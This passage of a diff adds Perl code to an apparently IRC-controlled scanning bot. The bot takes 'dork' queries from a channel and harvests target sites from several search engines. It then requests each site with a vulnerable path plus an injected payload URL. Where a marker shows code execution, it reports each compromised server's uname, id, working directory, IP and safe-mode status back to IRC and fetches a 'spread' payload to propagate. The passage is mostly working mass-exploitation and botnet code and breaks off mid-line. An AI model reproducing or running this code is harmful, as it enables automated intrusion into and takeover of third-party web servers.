+                                display( $dsp,"PRIVMSG $channel :3[3A3l6i7c3e3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[3A3l6i7c3e3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[3A3l6i7c3e3] Safe Mode OFF: $print"); 
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3A3l6i7c3e3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3A3l6i7c3e3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[3A3l6i7c3e3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3A3l6i7c3e3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3A3l6i7c3e3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[3A3l6i7c3e3] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+							}
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+	if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #ask
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @asklist = &ask($dork);
+                push( my @tot, @asklist );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 14A3S14K 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+                my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 14A3S14K 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[14A3S14K3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[14A3S14K3] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[14A3S14K3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[14A3S14K3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[14A3S14K3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[14A3S14K3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[14A3S14K3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[14A3S14K3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[14A3S14K3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[14A3S14K3] Safe Mode OFF: $print"); 
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[14A3S14K3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[14A3S14K3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[14A3S14K3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[14A3S14K3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[14A3S14K3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[14A3S14K3] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+ 
+ }
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #fireball
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @fireball = fireball($dork);
+                push( my @tot, @fireball );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 3F3i6r7e3B7a12ll 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+               my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 3F3i6r7e3B7a12ll 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3F3i6r7e3B7a12ll3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3F3i6r7e3B7a12ll3] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[3F3i6r7e3B7a12ll3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[3F3i6r7e3B7a12ll3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3F3i6r7e3B7a12ll3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[3F3i6r7e3B7a12ll3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[3F3i6r7e3B7a12ll3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3F3i6r7e3B7a12ll3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[3F3i6r7e3B7a12ll3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[3F3i6r7e3B7a12ll3] Safe Mode OFF: $print"); 
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3F3i6r7e3B7a12ll3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3F3i6r7e3B7a12ll3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[3F3i6r7e3B7a12ll3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3F3i6r7e3B7a12ll3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3F3i6r7e3B7a12ll3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[3F3i6r7e3B7a12ll3] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+							}
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #hotbot
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @hotlist = hotbot($dork);
+                push( my @tot, @hotlist );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 3H3o6t7B3o7t 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+				my $uni = scalar(@puliti);
+     
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 3H3o6t7B3o7t 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3H3o6t7B3o7t3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3
